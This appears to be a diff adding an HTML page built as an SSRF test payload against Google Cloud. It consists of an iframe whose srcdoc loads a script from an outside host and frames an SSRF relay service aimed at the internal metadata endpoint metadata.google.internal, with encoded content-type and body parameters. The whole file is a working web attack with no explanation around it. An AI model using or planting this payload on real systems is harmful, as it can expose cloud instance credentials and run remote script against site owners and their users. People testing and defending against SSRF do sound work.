@@ -1,0 +1,9 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>GCP Metadata SSRF Test Iframe</title>
+</head>
+<body>
+  <iframe srcdoc='<script src="https://donreddy.vercel.app"></script><iframe src="https://ssrf.localdomain.pw/custom-200/?url=http%3A%2F%2Fmetadata.google.internal&amp;content-type=YXBwbGljYXRpb24vanNvbg==&amp;body=eyJhIjpbeyJiIjoiMiIsImMiOiIzIn1dfQ==&amp;fakext=/j.json" title="GCP SSRF Test" width="50%" height="50%"></iframe>'></iframe>
+</body>
+</html>
